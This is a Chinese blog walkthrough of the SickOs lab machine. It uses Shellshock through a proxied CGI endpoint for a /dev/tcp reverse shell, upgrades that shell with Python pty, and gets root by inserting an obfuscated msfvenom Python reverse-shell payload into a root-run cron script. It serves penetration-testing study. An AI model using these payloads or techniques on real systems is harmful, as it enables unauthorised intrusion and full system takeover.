
#### 免责声明


本博客提供的所有信息仅供学习和研究目的，旨在提高读者的网络安全意识和技术能力。请在合法合规的前提下使用本文中提供的任何技术、方法或工具。如果您选择使用本博客中的任何信息进行非法活动，您将独自承担全部法律责任。本博客明确表示不支持、不鼓励也不参与任何形式的非法活动。


如有侵权请联系我第一时间删除


## nikto扫描



```
sudo nikto -h ip -useproxy http://ip:port
```

发现存在Shellshock漏洞，又称bashdoor `利用版本`：bash4\.1版本之前都存在这个漏洞


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231225078-957253874.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231225078-957253874.png)


扫描结果： 可能存在shellshock漏洞



```
/cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
```

详情见http://cve.mitre.org/cgi\-bin/cvename.cgi?name\=CVE\-2014\-6278 ，这是一个GNU Bash 环境变量命令注入漏洞 ，我对这个漏洞了解比较少，所以去找了几篇文章


[ShellShock（CVE\-2014\-6271）\-CSDN博客](https://github.com)


[Shellshock 漏洞 （CVE\-2014\-6271\) \- 知乎](https://github.com)


GNU Bash 4\.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。这个漏洞的英文是：ShellShock，中文名被XCERT命名为：破壳漏洞。该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10\.10中均拥有存在CVE\-2014\-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。漏洞的利用方式会通过与Bash交互的多种应用展开，包括HTTP、OpenSSH、DHCP等


## Shellshock


### 验证shellshock存在



```
sudo curl -v --proxy http://ip:3128 http://ip/cgi-bin/status -H "Referer:() { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
```

`-v` 显示更详细的信息


`http://ip/cgi-bin/status` nikto扫描出来的url


`-H " "`指定主机头 里面是一个恶意构造的http头，目的是利用Shellshock漏洞来尝试执行服务器上的命令。具体来说，它试图通过设置一个恶意的环境变量来触发漏洞，然后执行 `/usr/bin/id` 命令，该命令会输出当前用户的ID信息，包括用户名和所属用户组。


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231245439-1928849398.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231245439-1928849398.png)


### 利用shellshock反弹shell


用msfvenom生成payload


[MSF的使用教程 \- 黑客无极 \- 博客园](https://github.com)



```
sudo msfvenom -p cmd/unix/reverse_bash lhost=kali_ip lport=443 -f raw 
```

`-f, --format` 


 `指定 Payload 的输出格式(使用 --list formats 列出)`


\-f raw 表示直接输出payload的源代码


这个sh环境路径有可能无法使用，如果不行就改成绝对路径


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231254639-153841339.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231254639-153841339.png)


生成的payload



```
0<&137-;exec 137<>/dev/tcp/192.168.236.128/443;sh <&137 >&137 2>&137
```

nc开启监听后，使用payload



```
sudo curl -v --proxy http://192.168.236.133:3128 http://192.168.236.133/cgi-bin/status -H "Referer:() { test;}; echo 0<&137-;exec 137<>/dev/tcp/192.168.236.128/443;sh <&137 >&137 2>&137"
```

执行后监听有反应，但直接就断了，显示没有sh这个文件或路径


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231303209-1080601449.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231303209-1080601449.png)
那就修改一下：`/bin/sh`



```
sudo curl -v --proxy http://192.168.236.133:3128 http://192.168.236.133/cgi-bin/status -H "Referer:() { test;}; echo 0<&137-;exec 137<>/dev/tcp/192.168.236.128/443;/bin/sh <&137 >&137 2>&137"
```

成功拿到一个不完整的shell


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231310258-556766142.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231310258-556766142.png)


不过这个shell的交互性很差，查询这台机器上安装的软件，如果有python的话，就可以用python实现一个交互性更好的shell


## python提升shell交互性


#### 查询机器上已安装的软件


dpkg \-l 是一个在基于 Debian 的 Linux 发行版中使用的命令，用于列出系统上所有已安装的软件包。这个命令会显示软件包的名称、版本、架构和简短描述等信息。


当你运行 dpkg \-l 命令时，输出通常会被分成几列，每一列的含义如下：


第一列是两个字母的状态标志。第一个字母表示期望状态（如 'u' 表示未知，'i' 表示安装），第二个字母表示实际状态（如 'n' 表示未安装，'i' 表示已安装）。


第二列是软件包的名称。


第三列是软件包的版本号。


第四列是软件包的架构（例如，amd64, i386）。


第五列及之后的部分是软件包的简短描述。


如果你想要查看特定类型或名称的软件包，可以结合使用管道和 grep 命令来过滤输出。例如，要查找所有与 'python' 相关的已安装软件包，你可以运行：


dpkg \-l \| grep python


这将只显示包含 'python' 字符串的行。


靶机回显是有python的


#### python将普通Shell升级为交互式Shell


一下命令都是python升级交互式Shell的脚本，测试后发现前两个是能用的，第三个不能用



```
python -c 'import pty;pty.spawn("/bin/bash")'

这条命令使用了 pty 模块来创建一个伪终端（pseudo-terminal）。伪终端可以提供更接近于真实终端的交互体验，包括支持终端控制字符和信号处理。因此，这种方式启动的 shell 会话具有更好的交互性，可以像普通终端一样使用。
```


```
python -c '__import__("pty").spawn("/bin/bash")'

这条命令与第一条类似，只是使用了 __import__ 函数来动态导入 pty 模块。这种方式同样会创建一个伪终端，并且提供良好的交互性。
```


```
python -c "import os;os.system('/bin/bash')"

这条命令使用了 os 模块的 system 函数来启动一个新的 shell 会话。os.system 函数会调用系统的 system 函数，后者会通过 /bin/sh 来执行指定的命令。这种方式启动的 shell 会话有一些限制：
交互性较差：虽然 os.system 可以启动一个 shell，但它不会创建一个伪终端。这意味着你可能无法使用一些终端控制字符和信号处理功能，交互体验较差。
子进程管理：os.system 会在当前进程中启动一个新的子进程来执行命令。当命令执行完毕后，控制权会返回给父进程。这意味着如果你直接在命令行中运行 os.system('/bin/bash')，你会得到一个新的 shell 会话，但一旦你退出这个 shell，控制权会返回到原来的 Python 脚本。
```

## 自动任务提权


#### 信息收集 找到突破口cron.d下automate自动任务执行/var/www/connect.py


cd 到根目录后，我先看了/etc下的cron自动任务，



```
drwxr-xr-x  2 root root    4096 Sep 22  2015 console-setup
drwxr-xr-x  2 root root    4096 Dec  5  2015 cron.d
drwxr-xr-x  2 root root    4096 Sep 22  2015 cron.daily
drwxr-xr-x  2 root root    4096 Sep 22  2015 cron.hourly
drwxr-xr-x  2 root root    4096 Sep 22  2015 cron.monthly
drwxr-xr-x  2 root root    4096 Sep 22  2015 cron.weekly
-rw-r--r--  1 root root     722 Jun 20  2012 crontab
```

cat看一眼发现这些自动任务的权限都只有/bin/sh，例如crontab，如果是/bin/bash，就可以直接尝试使用这些自动任务进行提权



```
www-data@SickOs:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

再看一下cron.d，提示是一个文件夹，进去翻看有一个automate


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231342026-1477966051.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231342026-1477966051.png)



```
* * * * * root /usr/bin/python /var/www/connect.py
```

每分钟以root权限执行/var/www/下的connect.py


那我们先看一下 cat /var/www/connect.py



```
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

#### msfvenom生成payload



```
sudo msfvenom -p cmd/unix/reverse_python lhost=192.168.236.128 lport=444 -f raw

```


```
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqNkFELgjAUhf/K2NOEuLUlYoQPEgYRFaTvkmuhZJt45/+PZbA9el92d+53zxnrPoMZLUEj38oSQlbkVzg1w2ikQvSacf1+7luDNqN8J4AnKYhtAlyk1M+daRbHsVcwmzNgPtj/lh/r07WoguRZL2+Hc11W9yK/RIEJSKO1kpYx9wK/5fKiADQIz2kQDOHV9UobFnl2s5DjCzkRcEPmfw7ko+8ZXTedXmNLoy8kd1w/')[0])))
```

用vi编辑器将payload插入进connect.py中，这里给了一些vi的常用命令


#### vi编辑器



> 默认情况下，VI编辑器是命令模式，需要在里面写东西的时候需要进入编辑模式
> 
> 
> 命令模式到编辑模式：插入命令i,附加命令a,打开命令o，修改命令c，取代命令r，替换命令s
> 
> 
> 编辑模式到命令模式：Esc
> 
> 
> \*\*退出流程：
> 
> 
> 1\.进入命令模式
> 
> 
> 2\.进入末行模式
> 
> 
> 3\.在末行模式输入以下内容，对应相应操作\*\*
> 
> 
> 【:w】 保存文件
> 
> 
> 【:w!】 若文件为只读，强制保存文件
> 
> 
> 【:q】 离开vi
> 
> 
> 【:q!】 不保存强制离开vi
> 
> 
> 【:wq】 保存后离开
> 
> 
> 【:wq!】 强制保存后离开
> 
> 
> 【:! command】 暂时离开vi到命令行下执行一个命令后的显示结果
> 
> 
> 【:set nu】 显示行号
> 
> 
> 【:set nonu】 取消显示行号
> 
> 
> 【:w newfile】 另存为
> 
> 
> 2、插入命令
> i:插入光标前一个字符
> 
> 
> I:插入行首
> 
> 
> a：插入光标后一个字符
> 
> 
> A:插入行末
> 
> 
> o：向下新开一行，插入行首
> 
> 
> O：向上新开一行，插入行首
> 
> 
> 移动光标
> 
> 
> h:左移
> 
> 
> j:下移
> 
> 
> k:上移
> 
> 
> l:右移
> 
> 
> M:光标移动中间行
> 
> 
> L:光标移动到屏幕最后一行行首
> 
> 
> G：移动到指定行，行号 \-G
> 
> 
> {：按段移动，上移
> 
> 
> }：按段移动，下移
> 
> 
> Ctr\-d:向下翻半屏
> 
> 
> Ctr\-u：向上翻半屏
> 
> 
> gg:光标移动文件开头
> 
> 
> G：光标移动文件末尾
> 
> 
> 3、删除命令
> x：删除光标后一个字符，相当于del
> 
> 
> X: 删除光标前一个字符，相当于Backspace
> 
> 
> dd:删除光标所在行，n dd删除指定的行数D:删除光标后本行所有的内容，包括光标所在字符
> 
> 
> 4、撤销命令
> u：一步一步撤销
> 
> 
> ctr\-r：反撤销
> 
> 
> 5、重复命令
> .:重复上一次操作的命令


成功把payload插进connect.py[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231355933-2094088436.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231355933-2094088436.png)


## getshell


nc开启监听444端口


成功获得root权限，至此sickos两个解法都打完了


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231400737-1406389753.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241125231400737-1406389753.png)


  * [免责声明](#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E)
* [nikto扫描](#nikto%E6%89%AB%E6%8F%8F)
* [Shellshock](#shellshock):[westworld加速](https://tianchuang88.com)
* [验证shellshock存在](#%E9%AA%8C%E8%AF%81shellshock%E5%AD%98%E5%9C%A8)
* [利用shellshock反弹shell](#%E5%88%A9%E7%94%A8shellshock%E5%8F%8D%E5%BC%B9shell)
* [python提升shell交互性](#python%E6%8F%90%E5%8D%87shell%E4%BA%A4%E4%BA%92%E6%80%A7)
* [查询机器上已安装的软件](#%E6%9F%A5%E8%AF%A2%E6%9C%BA%E5%99%A8%E4%B8%8A%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6)
* [python将普通Shell升级为交互式Shell](#python%E5%B0%86%E6%99%AE%E9%80%9Ashell%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8Fshell)
* [自动任务提权](#%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83)
* [信息收集 找到突破口cron.d下automate自动任务执行/var/www/connect.py](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86--%E6%89%BE%E5%88%B0%E7%AA%81%E7%A0%B4%E5%8F%A3crond%E4%B8%8Bautomate%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8Cvarwwwconnectpy)
* [msfvenom生成payload](#msfvenom%E7%94%9F%E6%88%90payload)
* [vi编辑器](#vi%E7%BC%96%E8%BE%91%E5%99%A8)
* [getshell](#getshell)

   \_\_EOF\_\_

   ![](https://github.com/Sol9)Sol ’ blog  - **本文链接：** [https://github.com/Sol9/p/18569027](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 除特殊说明外，转载请注明出处～\[知识共享署名\-相同方式共享 4\.0 国际许可协议]
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
